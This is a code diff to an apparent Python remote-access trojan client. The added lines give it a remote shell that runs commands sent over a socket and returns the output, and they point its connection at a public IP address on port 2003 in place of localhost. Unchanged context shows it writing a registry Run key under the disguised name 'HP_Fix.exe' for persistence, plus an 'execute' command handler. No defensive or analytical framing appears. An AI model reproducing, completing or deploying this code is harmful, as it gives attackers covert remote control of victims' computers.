@@ -32,6 +32,19 @@ def create_botserver():
         else:
             pass
 
+def process_shell(cmd,s):
+    try:
+        #print(cmd)
+        pipe = subprocess.Popen(cmd,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        output = pipe.stdout.read()
+        s.send("DONE".encode())
+        #print(output.decode())
+        s.send(output)
+        #print("Sent")
+    except:
+        s.send("FAILED".encode())
+
+
 def start_regitry_edit():
     try:
         name_file = "HP_Fix.exe"
@@ -43,6 +56,7 @@ def start_regitry_edit():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,path,0,winreg.KEY_WRITE)
         winreg.SetValueEx(key,name,0,winreg.REG_SZ, value)
         winreg.CloseKey(key)
+        print("Values written")
         return True
     except PermissionError:
         return False
@@ -126,8 +140,14 @@ def start_session(s):
                 except Exception as e:
                     print("Error : %s"%(str(e)))
 
+            if "GETSHELL" in cmd:
+                shell_cmd = s.recv(1024).decode()
+                process_shell(shell_cmd,s)
+
             if "execute" in cmd:
-                cmd = cmd.strip("execute ")
+                #print("Original : %s"%(cmd))
+                cmd = cmd.strip("execute").strip('\r')
+                #print("Command received : %s"%(cmd))
                 try:
                     pipe = subprocess.call(cmd,shell=True)
                     if(pipe == 0):
@@ -150,7 +170,7 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("127.0.0.1",2003))
+            s.connect(("142.93.158.189",2003))
             #print("Connected")
             conn_process = Thread(target=start_session,args=(s,))
             conn_process.start()
